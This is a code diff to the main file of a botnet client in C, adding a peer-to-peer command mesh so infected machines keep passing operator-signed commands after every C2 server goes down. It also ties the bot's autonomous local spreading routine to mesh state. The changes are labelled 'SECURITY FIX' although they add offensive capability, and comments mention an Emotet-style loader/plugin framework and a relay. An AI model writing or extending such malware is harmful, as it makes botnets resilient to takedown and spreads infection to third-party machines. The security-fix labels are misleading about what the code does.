@@ -14,6 +14,7 @@
 #include "relay.h"
 #include "plugin.h"
 #include "killswitch.h"
+#include "mesh.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -109,6 +110,15 @@ static int init_bot(void) {
      * relay_enabled=1 AND a relay_token is configured (fail-closed). */
     g_bot.relay_enabled = RELAY_DEFAULT_ENABLED;
     g_bot.relay_port = RELAY_DEFAULT_PORT;
+
+    /* SECURITY FIX (#139): Decentralized P2P command/peer mesh. Off by
+     * default; starts only when mesh_enabled=1 AND a relay_token is set
+     * (MESH frames are auth'd with the shared fleet token) AND an
+     * operator pubkey is baked in (fail-closed command verification). */
+    g_bot.mesh_enabled = 0;
+    g_bot.mesh_port = MESH_DEFAULT_PORT;
+    g_bot.mesh_operator_pubkey[0] = '\0';
+    for (int i = 0; i < MESH_PEER_MAX; i++) g_bot.mesh_static_peers[i][0] = '\0';
 
     /* SECURITY FIX (#92): Loader/plugin framework (Bredolab/Emotet
      * split) on by default. The `plugin` C2 command dispatches the
@@ -301,6 +311,9 @@ static void cleanup_bot(void) {
     /* SECURITY FIX (#91): stop the ORB relay accept thread if it was
      * started at boot or via 'relay on'. */
     relay_stop();
+    /* SECURITY FIX (#139): stop the P2P mesh listener + gossip thread if
+     * it was started at boot or via the mesh runtime path. */
+    mesh_stop();
     
     /* Flush logs */
     log_flush();
@@ -373,6 +386,20 @@ int main(void) {
                      (unsigned)g_bot.relay_port);
         }
     }
+
+    /* SECURITY FIX (#139): P2P command/peer mesh. Starts at boot only when
+     * mesh_enabled=1 AND a relay_token is configured (MESH frame auth) AND
+     * an operator pubkey is baked in (fail-closed). Runs UNDER the C2
+     * channels: when all C2 endpoints die, the fleet still relays
+     * operator-signed commands peer-to-peer. */
+    if (g_bot.mesh_enabled && g_bot.relay_token[0] != '\0') {
+        if (mesh_start(&g_bot) == 0) {
+            log_info("MESH peer mesh started on 0.0.0.0:%d", g_bot.mesh_port);
+        } else {
+            log_warn("MESH peer mesh failed to start on port %u",
+                     (unsigned)g_bot.mesh_port);
+        }
+    }
     
     log_info("C2 protocols: IRC=%d HTTP=%d WS=%d",
              g_bot.c2_enabled & C2_IRC,
@@ -415,14 +442,15 @@ int main(void) {
             last_killswitch = time(NULL);
         }
         
-        /* Spread if not connected to primary C2. The gate is the LIVE
-         * connection state, not the config-enabled bitmask: a bot whose
-         * C2 is down (or disabled) falls back to autonomous spreading,
-         * while a connected bot waits for operator commands (#95).
-         * (#106): a WS-connected bot is equally operator-attached — a
-         * connected bot on ANY channel must not run spread_local. */
+        /* Spread if not connected to primary C2 AND no live mesh peers.
+         * The gate is the LIVE connection state, not the config-enabled
+         * bitmask: a bot whose C2 is down (or disabled) falls back to
+         * autonomous spreading, while a connected bot waits for operator
+         * commands (#95). (#139): a bot with live P2P peers is also
+         * operator-attached (the mesh can still deliver commands), so it
+         * must not run spread_local either. */
         if (!g_bot.c2_irc.connected && !g_bot.c2_http.connected &&
-            !g_bot.c2_ws.connected) {
+            !g_bot.c2_ws.connected && !mesh_has_peers()) {
             log_info("Primary C2 unavailable, spreading locally");
             spread_local(&g_bot);
         }
